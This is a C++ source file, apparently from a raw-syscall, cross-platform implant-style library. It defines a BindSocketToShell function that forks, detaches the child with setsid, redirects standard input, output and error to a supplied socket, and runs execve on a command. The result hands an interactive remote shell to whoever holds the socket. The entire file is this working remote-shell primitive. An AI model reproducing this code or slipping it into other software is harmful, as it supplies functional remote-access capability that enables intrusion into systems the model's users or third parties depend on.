#include "platform/system/process.h"
#if defined(PLATFORM_LINUX)
#include "platform/os/linux/common/syscall.h"
#include "platform/os/linux/common/system.h"
#elif defined(PLATFORM_MACOS)
#include "platform/os/macos/common/syscall.h"
#include "platform/os/macos/common/system.h"
#elif defined(PLATFORM_SOLARIS)
#include "platform/os/solaris/common/syscall.h"
#include "platform/os/solaris/common/system.h"
#endif

// BindSocketToShell - Main function to bind a socket to a shell process
Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
	if (socketFd < 0 || cmd == nullptr)
	{
		return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);
	}

	auto forkResult = Fork();

	if (forkResult.IsErr())
	{
		// Fork failed
		return Result<SSIZE, Error>::Err(forkResult, Error::Process_BindShellFailed);
	}

	auto& pid = forkResult.Value();

	if (pid == 0)
	{
		// Child process

		// Create new session (detach from controlling terminal)
		(void)Setsid();

		// Redirect stdin/stdout/stderr to socket
		if (Dup2(socketFd, STDIN_FILENO).IsErr() ||
			Dup2(socketFd, STDOUT_FILENO).IsErr() ||
			Dup2(socketFd, STDERR_FILENO).IsErr())
		{
			System::Call(SYS_EXIT, 1);
		}

		// Close original socket fd if it's not one of the standard fds
		if (socketFd > STDERR_FILENO)
		{
			System::Call(SYS_CLOSE, (USIZE)socketFd);
		}

		// Build argv/envp as USIZE arrays to pass through System::Call
		// directly, avoiding const_cast (execve does not modify these)
		USIZE argv[2];
		argv[0] = (USIZE)cmd;
		argv[1] = 0;

		USIZE envp[1];
		envp[0] = 0;

		// Execute the command - this should not return
		System::Call(SYS_EXECVE, (USIZE)cmd, (USIZE)argv, (USIZE)envp);

		// If execve returns, something went wrong - exit child
		System::Call(SYS_EXIT, 1);
	}

	// Parent process - return child PID
	return Result<SSIZE, Error>::Ok(pid);
}
